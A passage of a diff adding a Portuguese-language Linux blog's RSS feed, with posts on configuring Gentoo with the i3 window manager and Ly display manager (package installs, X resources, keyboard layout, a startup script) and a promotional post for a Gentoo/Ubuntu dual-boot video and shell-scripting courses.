+&lt;h2 id=&quot;acompanhe-todos-os-vídeos-da-série-shell-script-profissional&quot;&gt;Acompanhe todos os vídeos da &lt;strong&gt;Série Shell Script Profissional&lt;/strong&gt;&lt;/h2&gt;
+&lt;h1 id=&quot;shellpro&quot;&gt;&lt;a href=&quot;http://bit.ly/shell-pro-root&quot;&gt;#ShellPro&lt;/a&gt;&lt;/h1&gt;
+
+&lt;p&gt;Comente!&lt;/p&gt;
+</description>
+        <pubDate>Sun, 17 Mar 2019 16:34:48 -0300</pubDate>
+        <link>http://localhost:4000/2019/03/como-criar-um-sistema-de-desligamento-para-o-i3-com-shell-script.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/03/como-criar-um-sistema-de-desligamento-para-o-i3-com-shell-script.html</guid>
+        
+        <category>i3</category>
+        
+        <category>shellscript</category>
+        
+        <category>yad</category>
+        
+        <category>gentoo</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Gentoo + i3 + Ly</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/gentoo/gentooi3ly.jpg&quot; alt=&quot;Gentoo i3 Ly Screenshot&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Nesse vídeo configuramos o Gentoo pós instalação.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;comandos-executados&quot;&gt;Comandos executados&lt;/h2&gt;
+
+&lt;p&gt;Aplicativos instalados&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;USE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;jpeg png&quot;&lt;/span&gt; emerge &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; xorg-server xorg-x11 xf86-video-vesa xorg-drivers rxvt-unicode i3 i3status gentoolkit dhcpcd imlib2 feh dev-vcs/git&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Comando executados&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;dhcpcd.service
+useradd &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-G&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,wheel,audio,video,usb &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash marcos
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; login user
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;exec i3&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/.xinitrc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Arquivo &lt;kbd&gt;vim ~/.Xresources&lt;/kbd&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; special colors
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.foreground:  &lt;span class=&quot;c&quot;&gt;#bfc3bc&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.background:  &lt;span class=&quot;c&quot;&gt;#2d3335&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.cursorColor:  &lt;span class=&quot;c&quot;&gt;#bfc3bc&lt;/span&gt;
+
+URxvt&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;scrollBar:         &lt;span class=&quot;nb&quot;&gt;false
+&lt;/span&gt;URxvt&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;scrollBar_right:   &lt;span class=&quot;nb&quot;&gt;false
+
+&lt;/span&gt;URxvt&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;transparent:       &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;URxvt&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;shading:       10
+
+URxvt.font: xft:Monospace:pixelsize&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;19
+URxvt.letterSpace: 0
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;antialias:  &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;autohint:   &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois rode &lt;code class=&quot;highlighter-rouge&quot;&gt;xrdb ~/.Xresources&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Aquivo &lt;kbd&gt;vim 10-evdev.conf&lt;/kbd&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Section &lt;span class=&quot;s2&quot;&gt;&quot;InputClass&quot;&lt;/span&gt;
+    Identifier &lt;span class=&quot;s2&quot;&gt;&quot;evdev keyboard catchall&quot;&lt;/span&gt;
+    MatchIsKeyboard &lt;span class=&quot;s2&quot;&gt;&quot;on&quot;&lt;/span&gt;
+    MatchDevicePath &lt;span class=&quot;s2&quot;&gt;&quot;/dev/input/event*&quot;&lt;/span&gt;
+    Driver &lt;span class=&quot;s2&quot;&gt;&quot;evdev&quot;&lt;/span&gt;
+    Option &lt;span class=&quot;s2&quot;&gt;&quot;XkbLayout&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;br&quot;&lt;/span&gt;
+    Option &lt;span class=&quot;s2&quot;&gt;&quot;XkbVariant&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;abnt2&quot;&lt;/span&gt;
+EndSection&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois mova para &lt;code class=&quot;highlighter-rouge&quot;&gt;cp /home/marcos/10-evdev.conf /etc/X11/xorg.conf.d/10-evdev.conf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Clonando e instalar o &lt;a href=&quot;https://github.com/cylgom/ly&quot;&gt;Ly&lt;/a&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone &lt;span class=&quot;nt&quot;&gt;--recurse-submodules&lt;/span&gt; https://github.com/cylgom/ly
+make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class=&quot;nb&quot;&gt;install
+&lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ly.service
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ly/ &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Arquivo criado para setar o papel de parede &lt;a href=&quot;https://i.imgur.com/xZsf2Et.jpg&quot;&gt;Clique aqui para pegar o mesmo papel de parede do vídeo&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Criando o &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Script em Shell&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;vim ~/.start.sh&lt;/code&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/.fehbg
+xrdb ~/.Xresources&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Depois dar permissão para execução e adiciná-lo ao config do &lt;a href=&quot;https://i3wm.org/&quot;&gt;i3wm&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Adicione as linhas: &lt;code class=&quot;highlighter-rouge&quot;&gt;exec $HOME/.start.sh&lt;/code&gt; e &lt;code class=&quot;highlighter-rouge&quot;&gt;position top&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ~/.start.sh
+vim ~/.config/i3/config&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Assista ao vídeo&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;clique-aqui-para-assistir-o-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/tLDXUsSUEeA&quot;&gt;Clique Aqui Para Assistir o Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;conheça-nosso-treinamentos-de-shell-script-vim-expressões-regulares-e-sed&quot;&gt;Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrcursos&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;http://terminalroot.com.br/cursos&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;crie-sua-promoção&quot;&gt;Crie Sua Promoção&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrpromo&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;acompanhe-todos-os-vídeos-da-série-shell-script-profissional&quot;&gt;Acompanhe todos os vídeos da &lt;strong&gt;Série Shell Script Profissional&lt;/strong&gt;&lt;/h2&gt;
+&lt;h1 id=&quot;shellpro&quot;&gt;&lt;a href=&quot;http://bit.ly/shell-pro-root&quot;&gt;#ShellPro&lt;/a&gt;&lt;/h1&gt;
+</description>
+        <pubDate>Mon, 11 Mar 2019 20:49:37 -0300</pubDate>
+        <link>http://localhost:4000/2019/03/gentoo-i3-ly.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/03/gentoo-i3-ly.html</guid>
+        
+        <category>gentoo</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Como Instalar o Gentoo Linux em Dual Boot com o Ubuntu</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/gentoo/gentoo-ubuntu.jpg&quot; alt=&quot;Como Instalar o Gentoo Linux em Dual Boot com o Ubuntu&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Assista o vídeo e veja uma maneira fácil de instalar ao lado do Ubuntu o &lt;strong&gt;Gentoo Linux&lt;/strong&gt; , uma das distribuições mais &lt;u&gt;temidas&lt;/u&gt; pelos usuários Linux.&lt;/p&gt;
+
+&lt;p&gt;Estamos disponibilizando uma &lt;strong&gt;MEGA PROMOÇÃO IMPERDÍVEL&lt;/strong&gt; em comemoração ao &lt;em&gt;10 mil inscritos&lt;/em&gt; no &lt;a href=&quot;https://youtube.com/TerminalRootTV&quot;&gt;Canal TerminalRootTV&lt;/a&gt; e por 10 dias ou até o canal alcançar o 10 mil inscritos está valendo a promoção. Então, corra e aproveite logo, pois é por tempo limitado.&lt;/p&gt;
+
+&lt;p&gt;Na promoção você irá adquirir e &lt;strong&gt;Poder Baixar Todo Conteúdo pro seu Computador&lt;/strong&gt; por apenas &lt;strong&gt;R$ 129,90&lt;/strong&gt; , inclui todos os cursos: &lt;em&gt;Vim, Shell Script Iniciante, Sed, Expressões Regulares e Shell Script Extremamente Avançado.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Para adquirir tudo pelo preço diferenciado acesse o link:&lt;/p&gt;
+&lt;h2 id=&quot;httpbitlypromotop10&quot;&gt;&lt;a href=&quot;http://bit.ly/PromoTop10&quot;&gt;http://bit.ly/PromoTop10&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Saiba mais: &lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;clique-aqui-para-assistir-o-vídeo-como-instalar-o-gentoo-linux-em-dual-boot-com-o-ubuntu&quot;&gt;&lt;a href=&quot;http://bit.ly/2TbQ3mV&quot;&gt;Clique Aqui para assistir o Vídeo: Como Instalar o Gentoo Linux em Dual Boot com o Ubuntu&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Site oficial do Gentoo: &lt;a href=&quot;https://gentoo.org&quot;&gt;https://gentoo.org&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;valeu&quot;&gt;Valeu!&lt;/h1&gt;
+</description>
+        <pubDate>Mon, 25 Feb 2019 16:18:26 -0300</pubDate>
+        <link>http://localhost:4000/2019/02/como-instalar-o-gentoo-linux-em-dual-boot-com-o-ubuntu.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/02/como-instalar-o-gentoo-linux-em-dual-boot-com-o-ubuntu.html</guid>
+        
+        <category>gentoo</category>
+        
+        <category>ubuntu</category>
+        
+        <category>shellscript</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
